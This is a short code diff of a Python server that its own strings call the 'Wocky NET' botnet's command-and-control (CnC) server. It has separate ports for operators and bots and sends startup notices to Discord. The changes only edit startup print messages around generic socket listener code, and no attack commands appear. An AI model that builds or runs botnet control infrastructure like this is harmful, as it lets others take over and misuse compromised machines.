@@ -28,7 +28,7 @@ bots = [ ]
 cp_hostname = "\rQuantum >>: "
 
 
-print(f"Bot Port: {port}\r\n")
+print(f"Wocky Successfully started! | Cnc Port: {port} | Cnc Port: {bot_port}\r\n")
 Discord.send_news(f"Wocky NET Successsfully started!\r\n```Port {port}```")
 
 def handle_connection(client, addr):
@@ -94,7 +94,6 @@ def listener():
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((host, port))
         sock.listen()
-        print("Server started")
         while True:
                 client, address = sock.accept()
                 try:
@@ -110,7 +109,6 @@ def bot_listen():
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((host, bot_port))
         sock.listen()
-        print("Started bot")
         while True:
                 client, address = sock.accept()
                 try:
